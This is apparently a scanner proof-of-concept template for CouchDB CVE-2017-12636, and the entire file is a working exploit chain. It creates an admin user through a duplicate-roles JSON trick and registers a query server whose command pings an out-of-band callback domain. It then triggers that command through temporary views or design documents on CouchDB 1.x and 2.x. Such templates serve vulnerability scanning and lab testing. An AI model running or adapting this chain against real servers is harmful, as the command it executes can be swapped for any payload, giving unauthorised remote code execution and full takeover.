name: poc-yaml-couchdb-cve-2017-12636
manual: true
transport: http
set:
    re0: randomLowercase(16)
    re1: randomLowercase(16)
    re2: randomInt(8000, 10000)
    re3: randomInt(8000, 10000)
    re4: randomLowercase(5)
    re5: randomLowercase(6)
    re6: randomLowercase(3)
    re7: randomLowercase(32)
    reverse: newReverse()
    reverseDomain: reverse.domain
    base64R: base64(re0+":"+re1)
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /_users/org.couchdb.user:{{re0}}
            headers:
                Content-Type: application/json
            body: |-
                {
                  "type": "user",
                  "name": "{{re0}}",
                  "roles": ["_admin"],
                  "roles": [],
                  "password": "{{re1}}"
                }
            follow_redirects: false
        expression: response.status == 201 && response.body.bcontains(bytes("org.couchdb.user:" + re0))
    r1:
        request:
            cache: true
            method: PUT
            path: /_config/query_servers/{{re4}}
            headers:
                Authorization: Basic {{base64R}}
            body: |-
                "ping {{reverseDomain}}"
            follow_redirects: false
        expression: response.status == 200 && '^CouchDB/1'.matches(response.headers['Server'])
    r2:
        request:
            cache: true
            method: PUT
            path: /{{re5}}
            headers:
                Authorization: Basic {{base64R}}
            follow_redirects: false
        expression: response.status == 201 && '^CouchDB/1'.matches(response.headers['Server']) && response.body.bcontains(b'{"ok":true}')
    r3:
        request:
            cache: true
            method: PUT
            path: /{{re5}}/{{re6}}
            headers:
                Authorization: Basic {{base64R}}
            body: |-
                {"_id":"{{re7}}"}
            follow_redirects: false
        expression: response.status == 201 && '^CouchDB/1'.matches(response.headers['Server']) && response.body.bcontains(b'"ok":true')
    r4:
        request:
            cache: true
            method: POST
            path: /{{re5}}/_temp_view?limit=10
            headers:
                Authorization: Basic {{base64R}}
                Content-Type: application/json
            body: |-
                {"language":"{{re4}}","map":""}
            follow_redirects: false
        expression: reverse.wait(30)
    r5:
        request:
            cache: true
            method: GET
            path: /_membership
            headers:
                Authorization: Basic {{base64R}}
            follow_redirects: false
        expression: response.status == 200 && '^CouchDB/2'.matches(response.headers['Server']) && response.body.bcontains(b'"all_nodes"')
        output: 
            search: '"\\[\\\"(?P<password>.+?@.+?)\\\"\\]".bsubmatch(response.body)'
            password: search["password"]
    r6:
        request:
            cache: true
            method: PUT
            path: /_node/{{password}}/_config/query_servers/{{re4}}
            headers:
                Authorization: Basic {{base64R}}
            body: |-
                "ping {{reverseDomain}}"
            follow_redirects: false
        expression: response.status == 200 && '^CouchDB/2'.matches(response.headers['Server'])
    r7:
        request:
            cache: true
            method: PUT
            path: /{{re5}}
            headers:
                Authorization: Basic {{base64R}}
            follow_redirects: false
        expression: response.status == 201 && '^CouchDB/2'.matches(response.headers['Server']) && response.body.bcontains(b'{"ok":true}')
    r8:
        request:
            cache: true
            method: PUT
            path: /{{re5}}/{{re6}}
            headers:
                Authorization: Basic {{base64R}}
            body: |-
                {"_id":"{{re7}}"}
            follow_redirects: false
        expression: response.status == 201 && '^CouchDB/2'.matches(response.headers['Server']) && response.body.bcontains(b'"ok":true')
    r9:
        request:
            cache: true
            method: PUT
            path: /{{re5}}/_design/{{re6}}
            headers:
                Authorization: Basic {{base64R}}
                Content-Type: application/json
            body: |-
                {"_id":"_design/test","views":{"test":{"map":""} },"language":"{{re4}}"}
            follow_redirects: false
        expression: reverse.wait(30)

expression: r0() && ((r1() && r2() && r3() && r4()) || r5() && r6() && r7() && r8() && r9())
detail:
    author: Jarcis-cy(https://github.com/jarcis-cy)
    links:
        - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636